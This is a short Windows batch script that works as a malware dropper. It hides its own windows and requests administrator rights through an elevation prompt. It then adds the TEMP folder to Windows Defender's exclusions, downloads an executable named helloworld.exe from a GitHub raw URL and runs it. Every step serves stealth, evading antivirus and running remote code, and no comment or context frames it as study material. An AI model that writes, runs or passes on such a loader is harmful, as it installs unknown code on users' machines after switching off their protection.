@echo off
if "%~1"=="h" goto run

powershell -w hidden -Command "Start-Process '%~f0' h -WindowStyle Hidden"
exit /b

:run
net session >nul 2>&1
if not %errorlevel%==0 (
    powershell -w hidden -Command "Start-Process '%~f0' h -Verb RunAs -WindowStyle Hidden"
    exit /b
)

powershell -w hidden -c "Add-MpPreference -ExclusionPath '%TEMP%'"

curl -sL "https://github.com/analysisw/test/raw/refs/heads/main/helloworld.exe" -o "%TEMP%\helloworld.exe"

start "" "%TEMP%\helloworld.exe"